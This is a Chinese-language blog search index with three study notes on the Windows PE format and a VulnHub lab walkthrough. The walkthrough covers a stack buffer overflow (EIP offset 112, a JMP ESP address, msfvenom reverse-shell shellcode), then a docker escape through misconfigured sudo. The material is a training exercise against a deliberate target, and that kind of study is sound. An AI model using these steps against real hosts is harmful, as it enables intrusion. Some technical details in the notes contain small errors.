<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PE头结构分析</title>
    <url>/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>从0开始学习PE头</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>PE头分为标准PE头和可选PE头，其同为NT结构的成员</p>
<p>这里先找到DOS头指向PE头的地址</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322101533401.png" class title="image-20220322101533401">

<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322101849886.png" class title="image-20220322101849886">



<p>PE头是一个概称，由标准PE头和扩展PE头组成</p>
<p>查看PE的结构体_IMAGE_NT_HEADERS</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322102403205.png" class title="image-20220322102403205">

<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322102651245.png" class title="image-20220322102651245">

<p>MS-DOS头不分版本，PE头要分32位和64位</p>
<p>无论是32位还是64位，都是由三部分组成</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322103148210.png" class title="image-20220322103148210">



<p>和MS-DOS的MZ（WORD）不同，PE标识头是DWORD类型，占四个字节</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322103515861.png" class title="image-20220322103515861">



<h1 id="PE标准头分析"><a href="#PE标准头分析" class="headerlink" title="PE标准头分析"></a>PE标准头分析</h1><p>进入到NT头IMAGE_FILE_HEADERS的结构体里面观察</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322103814892.png" class title="image-20220322103814892">



<p>一共有七个参数</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322104112653.png" class title="image-20220322104112653">



<p>Machine表示可以运行在哪种CPU上</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322104235498.png" class title="image-20220322104235498">

<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322104259017.png" class title="image-20220322104259017">

<p>这些全是处理器平台，可以用PE头中Machine的值来对比，就可以知道运行在哪个平台上</p>
<p>第二个参数NumberOfSections代表区段的数量，这里用lordpe来看区段数量</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322104632932.png" class title="image-20220322104632932">



<p>第三个参数TimeDateStamp，程序创建的时间，使用的是格林尼治时间</p>
<p>一般右键属性就可以看到</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322105623579.png" class title="image-20220322105623579">

<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322104112653.png" class title="image-20220322104112653">

<p>第三个参数PointerToSymbolTable用的比较少，被debug模式替代了</p>
<p>第四个参数NumberOfSymbols，表示符号表中符号的数量</p>
<p>第五个参数SizeOfOptionalHeader表示PE文件头中扩展头的大小，在32位系统里是0x0010，64位是0x00f0，这两个值是最小值</p>
<p>最后一个字段表示PE文件的属性（exe，dll等有不同的属性值）</p>
<p>VS定义里面有一个宏定义，将PE属性做了一个整合</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322110425685.png" class title="image-20220322110425685">

<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322110601987.png" class title="image-20220322110601987">

<p>有非常多的信息，就不一一解释了</p>
<h1 id="PE扩展头分析"><a href="#PE扩展头分析" class="headerlink" title="PE扩展头分析"></a>PE扩展头分析</h1><img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322110829928.png" class title="image-20220322110829928">

<p>F12查看结构体有哪些东西</p>
<p>可以看到，参数比标准PE头多得多，其中重要的是VA和RVA的概念和几个参数的含义。</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322114831310.png" class title="image-20220322114831310">

<p><strong>1、什么是VA？什么是RVA？</strong></p>
<p><strong>VA（Virtual Address）</strong>，用户的PE文件被操作系统加载内存过后，PE对应的进程支配了自己独立的一个虚拟空间，在这个空间定位又被称为虚拟内存，就是VA，所以VA的范围00000000h~0fffffffh之间。在PE中进程本身的VA被解释成<strong>进程的基地址+相对虚拟内存地址</strong></p>
<p><strong>RVA（Reversc Virtual Address）</strong>是<strong>相对虚拟内存地址</strong>，相对虚拟内存地址是相对于基地址的一个偏移。也就是，RVA是虚拟内存当中用来定位某个特定位置的地址，这个地址的值是特定位置基于某个模块基地址（就相当于dll动态链接库加载进来成为了一个模块）的偏移量。</p>
<p><strong>FOA（File Offset Address）</strong>是<strong>文件偏移地址</strong>，文件偏移地址跟内存没什么关系，指的是某个位置距离文件头的一个偏移</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322112948246.png" class title="image-20220322112948246">

<p><strong>2、文件对齐（FileAlignment）和内存对齐（SectionAlignment）</strong></p>
<p>FileAlignment：文件中节的对齐粒度，文件中的节对齐并不是提高程序本身的执行效率，同样也是为了从磁盘加载的效率。</p>
<p>SectionAlignment：内存中节的对齐粒度，该资源指定了节被装入内存后的对齐单位。为什么要对齐？不对齐的数据可以节省空间，但没有规律，而且要在运行时需要从磁盘文件调入内存也是容易导致效率低下。</p>
<p>无论是在内存中还是硬盘上，都是是分块管理（分节），一块和一块存储空间之间是空隙。在硬盘上空隙有可能小于内存中空隙；在内存中空隙较大（相较于硬盘）。而存在间隙的原因则是分块管理。</p>
<p>分块的好处也有两个：节省硬盘和节省内存空间</p>
<p><strong>3、AddressOfEntryPoint</strong></p>
<p>程序执行的入口RVA，简称OEP，记录了启动代码距离该PE加载后起始位置到底有多少个字节。如果在一个可执行文件中附加了一段自己的代码，并且想让这段代码首先被执行，一般都要修改这里的值使之指向自己的代码的位置。对于一般程序映象来说，他就是启动地址；对于设备驱动程序来说，他是初始化函数地址。入口点对于DLL来说是可选的，如果不存在入口点，这个字段必须设置为0。（许多病毒程序、加载程序、补丁程序都会劫持这里的值，是指向自己的代码的地址。）</p>
<p><strong>4、checksum</strong></p>
<p>校验和，在大多数的PE文件中，该值是0，但在一些内核模式的驱动程序和系统DLL中，该值则是必须存在且正确的，比如kernel32.dll中PE的校验和是0011E97eh。</p>
<p><strong>5、imagebase</strong></p>
<p>该字段指出了PE映象的优先装入地址。也就是在IMAGE_OPTIONAL_HEADER32.AddressOfEntryPoint中说的程序被加载到内存后的起始VA。对于EXE文件来说，每个文件使用的都是独立的虚拟地址空间，所以，优先装入的地址通常不会被其他模块占据。也就是说，EXE文件总是能按照这个地址装入，这就意味着装入后的EXE文件不需要进行重定位了。可以自己定义这个值，但取值有限制：第一，取值不能超出边界，既取的值必须在进程地址空间中；第二，该值必须是64KB（0x7FF）的整数倍。</p>
<h1 id="打印信息"><a href="#打印信息" class="headerlink" title="打印信息"></a>打印信息</h1><p>查看Subsystem的一些定义，可执行文件期望能运行的子系统</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322114410215.png" class title="image-20220322114410215">



<p>可以将信息打印出来</p>
<img data-src="/2022/03/22/PE%E5%A4%B4%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20220322115754326.png" class title="image-20220322115754326">

<p>这就是分析一个基本PE头的过程</p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>区段表解析及遍历</title>
    <url>/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h1 id="区段表结构解析"><a href="#区段表结构解析" class="headerlink" title="区段表结构解析"></a>区段表结构解析</h1><h2 id="区段名及其含义"><a href="#区段名及其含义" class="headerlink" title="区段名及其含义"></a>区段名及其含义</h2><p>使用lordPE查看区段表</p>
<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327174738493.png" class title="image-20220327174738493">

<p>常用的一些区段</p>
<p>.text：表示代码段，里面的数据都是代码（有些编译器是code段）</p>
<p>.data：可读写的数据段，放的是全局变量和局部变量</p>
<p>.rdata：表示只读数据段，但程序中很少用到该块中的数据</p>
<p>.idata：放入导入表的信息</p>
<p>.edata：放入导出表的信息</p>
<p>.rsrc：表示资源段，如图标，菜单，位图等，这个区块是只读的</p>
<p>.bss：表示位初始化的数据，很少在用，取而代之的是执行文件的.data区块的的VirtualSize被扩展大的空间里用来装未初始化的数据</p>
<p>.crt：表示C++ 运行时(CRT)所添加的数据</p>
<p>.tls：表示线程局部存储器包括数据的初始化值，也包括运行时所需要的额外变量</p>
<p>.reloc：可执行文件的基址重定位，基址重定位一般仅Dll需要的</p>
<p>.sdata：相对于全局指针的可被定位的短的读写数据</p>
<p>.pdata：异常表,包含CPU特定的IAMGE_RUNTIME_FUNTION_ENTRY结构数组，DataDirectory中的IMAGE_DIRECTORY_ENTRY_EXCEPTION指向它</p>
<p>.didat：延迟装入输入数据，在非Release模式下可以找到</p>
<p>从区段表可以看出.text段的RVA为1000，大小为A966，也就是说.text区段在内存中的位置是从1000~B966。其他区段也是一样的</p>
<p>所以因此可以画出程序加载到内存后的分布，以及文件在硬盘的分布</p>
<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327180422539.png" class title="image-20220327180422539">

<p>程序加载到内存之后，都会分配4GB的内存地址空间（注：并不是内存大小）。在区段与区段之间并不是紧挨着的，因为内存会进行0x1000的内存对齐，空出来的空间进行填充0字节的数据。例如B966~C000的空间都是填充的0字节数据。<strong>010editor中区段与区段之间，会存在填充0的部分，这也是为了实现文件对齐。</strong></p>
<p><strong>如何识别一个区段为代码段还是其他区段?（名字为.text并不一定就是代码块，.text可以改成任意名称，比如.asd）</strong></p>
<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181036922.png" class title="image-20220327181036922">

<p>RVA&#x3D;1000的是代码块</p>
<p>最主要的还是查看特征值的属性，每个区段的属性都不一样</p>
<p>这是.text的属性</p>
<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181302574.png" class title="image-20220327181302574">

<p>这是.rdata的属性</p>
<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181402627.png" class title="image-20220327181402627">





<h2 id="每个区段的基本信息"><a href="#每个区段的基本信息" class="headerlink" title="每个区段的基本信息"></a>每个区段的基本信息</h2><p>区段表中，每0x28个字节保存一个区段的信息<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327181637451.png" class title="image-20220327181637451"></p>
<p>查看区段的一些信息</p>
<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323100649979.png" class title="image-20220323100649979">

<p>一些基本特征</p>
<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323101502214.png" class title="image-20220323101502214">



<p>根据区段的基本特征打印相关属性（复习的时候发现这里打错了，VSize对应字段和RSize对应字段写反了，下图为重新更正的正确值）</p>
<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327161617678.png" class title="image-20220327161617678">

<p>成功打印出了区段的属性</p>
<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220327175531064.png" class title="image-20220327175531064">

<p>与LordPE进行对比是没有错误的，这就是一次对区段表的遍历</p>
<p>参考：<a href="https://blog.csdn.net/qq_30145355/article/details/78859214">https://blog.csdn.net/qq_30145355/article/details/78859214</a></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>PE中的DOS头解析</title>
    <url>/2022/03/21/PE%E4%B8%AD%E7%9A%84DOS%E5%A4%B4%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p>从0开始学习PE头</p>
<h1 id="什么是PE文件？"><a href="#什么是PE文件？" class="headerlink" title="什么是PE文件？"></a>什么是PE文件？</h1><p>PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件，PE文件是微软windows上的程序文件（可能是间接被执行，如DLL）。PE文件有一个共同特点：前两个字节为4D 5A（MZ）。如果一个文件前两个字节不是4D 5A则其肯定不是可执行文件。Linux上的是elf文件结构。</p>
<p>一个概括图</p>
<img data-src="/2022/03/21/PE%E4%B8%AD%E7%9A%84DOS%E5%A4%B4%E8%A7%A3%E6%9E%90/image-20220321195237716.png" class title="image-20220321195237716">

<h1 id="MS-DOS头结构的学习，共40h（64字节）"><a href="#MS-DOS头结构的学习，共40h（64字节）" class="headerlink" title="MS-DOS头结构的学习，共40h（64字节）"></a>MS-DOS头结构的学习，共40h（64字节）</h1><p>用的是010editor进行学习</p>
<p>这里就是一个MS-DOS头</p>
<img data-src="/2022/03/21/PE%E4%B8%AD%E7%9A%84DOS%E5%A4%B4%E8%A7%A3%E6%9E%90/image-20220321203516959.png" class title="image-20220321203516959">

<p>主要是为了防止PE文件运行在MS-DOS系统的时候出现一些错误，就是出于兼容性的目的。每个PE文件是以一个DOS程序开始的，有了它，一旦程序在DOS下执行，DOS才能识别出这是有效的执行体。</p>
<p>后面的一串字符叫MS-Sub，有了这两部分，程序一旦在DOS系统下运行，就会出现一个错误提醒：this program cannot be run in MS-DOS mode。这些是垃圾值，以及编译器填充的垃圾字符。</p>
<img data-src="/2022/03/21/PE%E4%B8%AD%E7%9A%84DOS%E5%A4%B4%E8%A7%A3%E6%9E%90/image-20220321204220683.png" class title="image-20220321204220683">



<p>在vs中查看DOS的结构体，_IMAGE_DOS_HEADER，F12可以查看里面调用的接口函数</p>
<img data-src="/2022/03/21/PE%E4%B8%AD%E7%9A%84DOS%E5%A4%B4%E8%A7%A3%E6%9E%90/image-20220321225113289.png" class title="image-20220321225113289">



<p>MS-DOS头的结构</p>
<p>e_magic决定是不是MS-DOS的一个标志，用来判断文件是不是可执行文件，e_lfanew指向新的PE头的字段（这两个最重要）</p>
<p>其余函数的含义如下</p>
<img data-src="/2022/03/21/PE%E4%B8%AD%E7%9A%84DOS%E5%A4%B4%E8%A7%A3%E6%9E%90/image-20220321231147151.png" class title="image-20220321231147151">



<p>用结构体对象的指针指向_IMAGE_DOS_HEADER</p>
<img data-src="/2022/03/21/PE%E4%B8%AD%E7%9A%84DOS%E5%A4%B4%E8%A7%A3%E6%9E%90/image-20220322084412293.png" class title="image-20220322084412293">



<p>在标志位设置断点，调试后可以发现，在此处会进行填充，ReadDosHeader和buffer都是指针，要进行强制转换</p>
<img data-src="/2022/03/21/PE%E4%B8%AD%E7%9A%84DOS%E5%A4%B4%E8%A7%A3%E6%9E%90/image-20220322084439095.png" class title="image-20220322084439095">



<p>F10调试一下过后发现DOS头已经被填满了（用16进制来显示）</p>
<img data-src="/2022/03/21/PE%E4%B8%AD%E7%9A%84DOS%E5%A4%B4%E8%A7%A3%E6%9E%90/image-20220322084544149.png" class title="image-20220322084544149">



<p>可以打印出一些属性看看</p>
<img data-src="/2022/03/21/PE%E4%B8%AD%E7%9A%84DOS%E5%A4%B4%E8%A7%A3%E6%9E%90/image-20220322084827815.png" class title="image-20220322084827815">

<img data-src="/2022/03/21/PE%E4%B8%AD%E7%9A%84DOS%E5%A4%B4%E8%A7%A3%E6%9E%90/image-20220322085328264.png" class title="image-20220322085328264">

]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之缓冲区溢出</title>
    <url>/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="初步的信息收集"><a href="#初步的信息收集" class="headerlink" title="初步的信息收集"></a>初步的信息收集</h1><p>对靶机进行端口扫描，看到开放了21端口留意可能有匿名登陆</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304203927341.png" class title="image-20220304203927341">



<p>扫描一下端口开放的详细服务信息</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204123320.png" class title="image-20220304204123320">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204147762.png" class title="image-20220304204147762">



<p>这种有ctf风格的靶场肯定不会开一个没有意义的端口的。。登陆ftp服务，顺便搜一波现成的漏洞。搜出来是ddos，打扰了。</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204345188.png" class title="image-20220304204345188">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204404524.png" class title="image-20220304204404524">



<p>ftp中可能有好东西，看见的东西都下载到本机</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204505067.png" class title="image-20220304204505067">



<p>查看下载的文件，运行下发现居然没东西</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204646309.png" class title="image-20220304204646309">



<p>看到这里感觉不对劲，这是个可执行程序，执行了肯定有进程产生的，看一看进程吧</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204847774.png" class title="image-20220304204847774">



<p>再联想到目标靶机开启了9898端口，八九不离十了这就是突破点，但还是看一看web服务吧</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205134019.png" class title="image-20220304205134019">



<p>对web进行信息搜集一波，看看源代码，爆破一下目录</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205236054.png" class title="image-20220304205236054">



<p>更确定了这极有可能是应用程序的漏洞，监听本地9898端口</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205522149.png" class title="image-20220304205522149">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205537331.png" class title="image-20220304205537331">

<p>看到这里已经懂得都懂了，直接进入正题了</p>
<h1 id="edb调试"><a href="#edb调试" class="headerlink" title="edb调试"></a>edb调试</h1><p>如果kali没有安装edb-debugger，可以先安装一个</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205836105.png" class title="image-20220304205836105">



<p>开启本地监听打开edb进行调试，这个地方一定要以root权限打开edb不然会有各种问题</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223641368.png" class title="image-20220304223641368">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223654911.png" class title="image-20220304223654911">



<p>python生成500个A注入到程序中，观察edb发生的变化</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223811343.png" class title="image-20220304223811343">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223827023.png" class title="image-20220304223827023">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223855172.png" class title="image-20220304223855172">

<p>（报错了，一切都在设想当中）</p>
<p>EIP寄存器全被被A占满，说明一定在这个参数输入的地方存在缓冲区溢出</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223926084.png" class title="image-20220304223926084">



<p>理清思路接下来要干嘛</p>
<p>EIP寄存器存储接下来要执行指令的代码所在的内存地址，ESP是寄存具体的代码的。这两个寄存器的内容都可以进行覆盖，如果能找到一个jump to esp，跳转到esp这样的指令他所在内存空间的地址的话，就可以将这条指令的内存地址，写入到eip寄存器，从而利用jump esp指令强制cpu去执行esp中寄存的程序的代码，因此我们可以提交payload内容替换esp中的内容，可以在其中提交反弹shell的程序代码。因此可以修改eip当中的内容，从而将指令跳转到esp寄存器，esp中存储着我们的恶意代码，一旦这些代码被执行，就会反弹一个shell到kali。</p>
<p>理清思路后再想想第一步要干嘛，就是在eip寄存器当中写入jump esp这条指令的地址，那么首先就要在这500个A当中确定是从哪一个A开始覆盖了eip寄存器，kali当中msf-pattern_create可以生成随机的字符串</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224821183.png" class title="image-20220304224821183">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224830607.png" class title="image-20220304224830607">



<p>注入随机字符串后，edb直接报错（每一次调试都要重新启动应用服务和edb）</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224959040.png" class title="image-20220304224959040">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225012042.png" class title="image-20220304225012042">



<p>现在eip中就是随机字符串当中四个字符的ASCII码，再查一下这四个字符再随机字符串的位置</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225131530.png" class title="image-20220304225131530">

<p>这里也就是说，从112位置开始，eip寄存器被覆盖了四个字符</p>
<h1 id="脚本验证，EXP编写"><a href="#脚本验证，EXP编写" class="headerlink" title="脚本验证，EXP编写"></a>脚本验证，EXP编写</h1><p>写个脚本验证，果然eip被四个B占满</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225300919.png" class title="image-20220304225300919">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225319309.png" class title="image-20220304225319309">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225341987.png" class title="image-20220304225341987">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225443972.png" class title="image-20220304225443972">

<p>（这里一定要以python2来执行验证脚本）</p>
<p>现在就要在edb中查找jump esp的指令地址，一定是有x执行权限的服务</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225558528.png" class title="image-20220304225558528">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225620876.png" class title="image-20220304225620876">



<p>将结果插入到程序代码（B的位置），因为大头小头字节序，地址从低位到高位读取。’\x55\x9d\x04\x08’</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225751989.png" class title="image-20220304225751989">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225803607.png" class title="image-20220304225803607">



<p>使用msf生成反弹shell的代码，要过滤坏字符，防止程序遇到\x00终止运行</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225903497.png" class title="image-20220304225903497">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225915589.png" class title="image-20220304225915589">

<p>（空字符是保证程序不出错）</p>
<p>重启服务端程序设置nc监听</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225952851.png" class title="image-20220304225952851">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230010631.png" class title="image-20220304230010631">

<p>（这是在本机做的实验）</p>
<p>将IP端口改为目标机器重新设置监听</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230210120.png" class title="image-20220304230210120">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230219455.png" class title="image-20220304230219455">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230229256.png" class title="image-20220304230229256">



<h1 id="反弹shell后docker逃逸"><a href="#反弹shell后docker逃逸" class="headerlink" title="反弹shell后docker逃逸"></a>反弹shell后docker逃逸</h1><p>获得了一个普通权限shell，进行信息收集</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230349765.png" class title="image-20220304230349765">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230359143.png" class title="image-20220304230359143">



<p>ssh连接22端口不行，那么就连接之前探测到的2222端口</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230442016.png" class title="image-20220304230442016">



<p>好家伙，发现还是个docker容器，那就docker逃逸吧</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230618570.png" class title="image-20220304230618570">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230628961.png" class title="image-20220304230628961">



<p>权限配置不当，容器有sudo权限，那就切换成容器的root，查看root文件</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230721118.png" class title="image-20220304230721118">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230733436.png" class title="image-20220304230733436">



